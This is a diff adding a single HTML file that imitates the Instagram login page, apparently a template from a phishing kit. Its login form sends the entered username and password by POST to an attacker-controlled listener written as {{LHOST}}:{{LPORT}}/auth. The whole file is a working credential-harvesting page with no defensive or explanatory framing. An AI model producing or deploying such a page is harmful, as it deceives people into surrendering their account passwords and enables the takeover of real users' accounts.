@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border: 1px solid #dbdbdb; border-radius: 1px; width: 270px; text-align: center; }
+        h2 { font-family: "Instagram Sans", cursive, sans-serif; font-size: 32px; margin-bottom: 30px; font-weight: normal; }
+        input { width: 100%; padding: 9px 0 7px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 12px; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #1877f2; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instagram</h2>
+        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
+            <input type="text" name="user" placeholder="Phone number, username, or email" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
